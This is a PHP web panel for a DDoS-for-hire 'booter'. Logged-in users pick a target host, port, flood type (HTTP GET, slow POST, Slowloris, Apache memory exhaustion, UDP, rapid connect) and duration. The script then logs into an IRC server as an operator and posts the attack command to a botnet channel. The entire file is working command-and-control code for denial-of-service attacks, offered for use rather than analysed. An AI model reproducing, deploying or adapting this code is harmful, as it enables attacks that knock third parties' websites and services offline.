<?php
$ircserverhost = "irc.server.net";
$ircserverport = 6667;
$ircserverpass = FALSE; //replace with '$ircserverpass = "SERVER-PASS-HERE";' for an IRC network/server with a password
$operuser = "OPERUsername";
$operpass = "OPERPassword";
$bootchannel = "#BooterChannel";
$authhost = "Auth.Host";
$userlist = "username1:password1 username2:password2 username3:password3"; //Usernames must be 5+ characters & Passwords must be 7+ characters

echo "<head>
<title>blank</title>
</head>";

$server = array();
function SendCommand($cmd)
{
    global $debug, $server;
    $cmd = trim($cmd, "\n");
    $cmd = trim($cmd, "\r");
    $cmd = "$cmd\n\r";
    $sstrlen = strlen($cmd);
    @fwrite($server['SOCKET'], $cmd, $sstrlen);
    //echo "[SEND][$sstrlen] $cmd<br />";
}

function SendToChannel($attacktype, $attacktarget, $attackport, $attacktime, $username, $stop)
{
    global $ircserverhost, $ircserverport, $ircserverpass, $operuser, $operpass, $bootchannel, $authhost, $debug, $server;
    $ParamsAllowed = FALSE;

    if(!stop)
    {
        if(($attackport >= 0) && ($attackport <= 65535))
        {
            if(strstr($attacktarget, "."))
            {
                $ParamsAllowed = TRUE;
            }
            else
            {
                echo "<b>ERR:</b> Make sure host/ip parameters are <u>valid</u><hr>";
                $ParamsAllowed = FALSE;
            }
        }
        else
        {
            echo "<b>ERR:</b> Make sure port parameters are <u>valid</u><hr>";
            $ParamsAllowed = FALSE;
        }
    }
    else
    {
        $ParamsAllowed = TRUE;
    }

    if($ParamsAllowed)
    {
        $CommandSent = FALSE;
        $LogBug = FALSE;
        $hLogOpen = fopen("BotBooter-log.txt", "a+");
        if(!$hLogOpen)
        {
            $LogBug = TRUE;
        }

        if($stop)
        {
            $LogFileAdd = "[".date(r)."] - USER: $username - COMMAND: '!stop'\n";
        }
        else
        {
            $LogFileAdd = "[".date(r)."] - USER: $username - COMMAND: '!$attacktype $attacktarget $attackport $attacktime'\n";
        }

        $hWriteToLog = fwrite($hLogOpen, $LogFileAdd);
        if(!$hWriteToLog)
        {
            $LogBug = TRUE;
        }
        fclose($hLogOpen);

        if(!$LogBug)
        {
            ignore_user_abort(TRUE);
            set_time_limit(0);
            $nickname = $username."|".rand(100,999);
            $server['SOCKET'] = @fsockopen($ircserverhost, $ircserverport, $errno, $errstr, 2);
            if($server['SOCKET'])
            {
                if($ircserverpass) SendCommand("PASS $ircserverpass");
                SendCommand("USER $nickname 0 * :$nickname");
                SendCommand("NICK $nickname");
                while(!feof($server['SOCKET']))
                {
                    $server['READ_BUFFER'] = fgets($server['SOCKET'], 1024);
                    //$rstrlen = strlen($server['READ_BUFFER']);
                    //echo "[RECIVE][$rstrlen] ".$server['READ_BUFFER']."<br />";
                    if(strstr($server['READ_BUFFER'], " 376 ".$nickname))
                    {
                        $CommandSent = TRUE;
                        SendCommand("OPER $operuser $operpass");
                        SendCommand("SETHOST $authhost");
			if($stop)
                	{
                    	    SendCommand("SETIDENT stop");
                	}
			else
                	{
                    	    SendCommand("SETIDENT $attacktype");
                	}
                        if($stop)
                        {
                            SendCommand("SAJOIN $nickname #Flood[$username]");
			    usleep(500000);
                            SendCommand("PRIVMSG #Flood[$username] :!stop");
                        }
                        else
                        {
                            SendCommand("SAJOIN $nickname $bootchannel");
			    usleep(500000);
                            SendCommand("PRIVMSG $bootchannel :!$attacktype $attacktarget $attackport $attacktime");
                        }
                        SendCommand("QUIT :Quitting...");
                    }
                    elseif(substr($server['READ_BUFFER'], 0, 6) == "PING :")
                    {
                        SendCommand("PONG :".substr($server['READ_BUFFER'], 6));
                    }
                    flush();
                }

                if($CommandSent)
                {
                    echo "<b>OK:</b> Command sent<hr>";
                }
                else
                {
                    echo "<b>ERR:</b> Failed to register with remote end<hr>";
                }
                EchoBootPage($username);
            }
            else
            {
                echo "<b>ERR:</b> Failed to connect<hr>";
                EchoBootPage($username);
            }
        }
        else
        {
            echo "<b>ERR:</b> Problem writing to log file - command not sent";
        }
    }
    else
    {
        EchoBootPage($username);
    }
}

function EchoLoginPage()
{
    echo "<pre><div align=center><form name=\"form\" method=\"post\" action=\"".$_SERVER['PHP_SELF']."\">
    <p><label for=\"username\">Username:
    </label>
    <br /><input type=\"text\" title=\"Username\" name=\"username\" /></p>
    <p><label for=\"password\">Password:
    </label>
    <br /><input type=\"password\" title=\"Password\" name=\"password\" /></p>
    <p><input type=\"submit\" name=\"Submit\" value=\"Login\" /></p>
    </form></div></pre>";
}

function EchoBootPage($username)
{
    echo "<form name=\"form\" method=\"post\" action=\"".$_SERVER['PHP_SELF']."\">
    <input type=\"hidden\" name=\"username\" value=\"$username\">
    <b>Username:</b> $username
    <br /><label for=\"password\"><b>Password:</b></label> <input type=\"password\" title=\"Password\" name=\"password\" /></p><hr>
    <p><label for=\"attacktarget\"><b>Target Hostname/IP:</b></label>
    <br /><input type=\"text\" title=\"attackarget\" name=\"attacktarget\" /></p>
    <p><label for=\"attackport\"><b>Port</b>(<i>Put 0 for random ports while flooding UDP -- Put 80 for websites</i>):</label>
    <br /><input type=\"text\" title=\"attackport\" name=\"attackport\" /></p>
    <p><label for=\"attacktype\"><b>Type:</b></label>
    <br /><input type=\"radio\" name=\"attacktype\" value=\"httpget\"> Rapid HTTP GET
    <br /><input type=\"radio\" name=\"attacktype\" value=\"httppost\"> Slow HTTP POST
    <br /><input type=\"radio\" name=\"attacktype\" value=\"slowloris\"> Slowloris
    <br /><input type=\"radio\" name=\"attacktype\" value=\"arme\"> ARME[<b>A</b>pache <b>R</b>emote <b>M</b>emory <b>E</b>xhaustion]
    <br /><input type=\"radio\" name=\"attacktype\" value=\"httpcombo\"> HTTP Combo
    <br /><input type=\"radio\" name=\"attacktype\" value=\"udp\"> UDP
    <br /><input type=\"radio\" name=\"attacktype\" value=\"condis\"> Rapid Connect/Disconnect</p>
    <p><label for=\"attacktime\"><b>Amount of Time:</b></label>
    <br /><input type=\"radio\" name=\"attacktime\" value=\"15\"> 15 Seconds
    <br /><input type=\"radio\" name=\"attacktime\" value=\"30\"> 30 Seconds
    <br /><input type=\"radio\" name=\"attacktime\" value=\"60\"> 60 Seconds
    <br /><input type=\"radio\" name=\"attacktime\" value=\"120\"> 120 Seconds
    <br /><input type=\"radio\" name=\"attacktime\" value=\"180\"> 180 Seconds
    <br /><input type=\"radio\" name=\"attacktime\" value=\"240\"> 240 Seconds
    <br /><input type=\"radio\" name=\"attacktime\" value=\"300\"> 300 Seconds
    <br /><input type=\"radio\" name=\"attacktime\" value=\"360\"> 360 Seconds</p><hr>
    <input type=\"checkbox\" name=\"stop\" value=\"TRUE\"> <b>Stop command</b>(<i>optional</i>)</p><hr>
    <p><input type=\"submit\" name=\"Submit\" value=\"Submit Command\" /></p>
    </form>";
}

if(($_POST['username']) && ($_POST['password']))
{
    if((strstr($userlist, $_POST['username'].":".$_POST['password'])) && (strlen($_POST['username']) >= 5) && (strlen($_POST['password']) >= 7))
    {
        if(($_POST['attacktarget']) && ($_POST['attackport']) && ($_POST['attacktype']) && ($_POST['attacktime']) && (!$_POST['stop']))
        {
            SendToChannel($_POST['attacktype'], $_POST['attacktarget'], $_POST['attackport'], $_POST['attacktime'], $_POST['username'], FALSE);
        }
        elseif((($_POST['attacktarget']) || ($_POST['attackport']) || ($_POST['attacktype']) || ($_POST['attacktime'])) && (!$_POST['stop']))
        {
            echo "<b>ERR:</b> Fill in all fields<hr>";
            EchoBootPage($_POST['username']);
        }
        elseif($_POST['stop'])
        {
            SendToChannel(NULL, NULL, NULL, NULL, $_POST['username'], $_POST['stop']);
        }
        else
        {
            EchoBootPage($_POST['username']);
        }
    }
    else
    {
        echo "<div align=center><b>ERR:</b> Invalid login</div><hr>";
        EchoLoginPage();
    }
}
elseif(($_POST['username']) || ($_POST['password']))
{
    echo "<div align=center><b>ERR:</b> Fill in login field(s)</div><hr>";
    EchoLoginPage();
}
else
{
    EchoLoginPage();
}
?>

